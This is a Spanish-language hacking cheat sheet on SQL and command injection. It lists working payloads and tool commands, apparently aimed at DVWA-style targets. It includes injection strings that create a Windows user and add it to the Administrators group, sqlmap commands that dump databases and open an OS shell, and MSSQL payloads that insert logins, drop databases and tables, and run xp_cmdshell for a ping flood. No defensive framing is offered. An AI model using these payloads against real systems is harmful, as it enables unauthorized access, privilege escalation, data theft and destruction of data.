# Inyecciones SQL 

Tags: #Hacking #SQLI #MSSQL #SQLMap #BurpSuite  #Ñ 

## Inyecciones

```bash 
http://IP:8080/DVWA/login.php       # Ruta por defecto al login en un DVWA
```

```bash 
# Linux
❯ input | pwd 
❯ input ; ls         

# Windows
❯ input && net user    # Muestra las cuentas de usuarios en el sistema 
❯ input && type C:\wamp64\www\DVWA\upload\file.txt   # Muestra el contenido del archivo 
❯ input | net user 
❯ input | net user Test pass123 /Add
❯ input | net localgroup Administrator Test /Add
```

## XSS

```bash
❯ python3 pwnxss.py -u http://www.domain.com   # Verificar si la aplicación es vulnerable a XSS
```

## SQLMap 

```bash 
# Kali Tool

Nota:
	1. Se necesita estar dentro con credenciales validas para asi obtener la cookie 
	2. Buscar el campo donde se encuentre el 'id=1' 
	3. Ir al 'Inspector', dar click en 'Console' y colocar '>> document.cookie'

❯ sqlmap -u "http://domain.com/file.aspx?id=1" --cookie="cookie_value" --dbs   # Mostrar las DBs
❯ sqlmap -u "http://domain.com/file.aspx?id=1" --cookie="cookie_value" -D database --tables 
❯ sqlmap -u "http://domain.com/file.aspx?id=1" --cookie="cookie_value" -D database -T user_login --dump

❯ sqlmap -u "http://domain.com/file.aspx?id=1" --cookie="cookie_value" --os-shell  # Obtener un shell 'Y'
	❯ hostname       # Si quieremos tener el 'standar output' dar click en 'Y'
	❯ tasklist 
	❯ help
```

```bash 
# BurpSuite y SQLMap

Nota:
	1. Dar click derecho en la petición y seleccionar 'save item' para guardarlo como un archivo '.txt'

❯ sqlmap -r file.txt --dbs    # Mostrar las DBs
❯ sqlmap -r file.txt -D database --tables 
❯ sqlmap -r file.txt -D database -T users --columns 
❯ sqlmap -r file.txt -D database --dump 
```

## JSQL

```bash 
# Kali Tool
❯ jsql     

Nota:
	1. Colocar la url que contenga el parametro ?id=1 en 'GET' 
	2. La herramienta te mostrará todas las DBs y su contenido 
	3. Cuando se selecione una columna, se debe dar click derecho a la tabla y dar en 'Search'
```

## Inyecciones DB MSSQL 

```bash 
❯ input';insert into login values("omar","apple123"); --   # Agregar un usuario por medio de una SQL Blind'
❯ input';CREATE DATABASE mydatabase; --                    # Crear una DB' 
❯ input';DROP DATABASE mydatabase; --                      # Borrar la DB' 
❯ input';DROP TABLE table_name; --                         # Borrar una tabla' 

❯ input';exec master..xp_cmdshell 'ping www.google.com -l 65000 -t';--    # Hacer ping a un host especifico' 
```

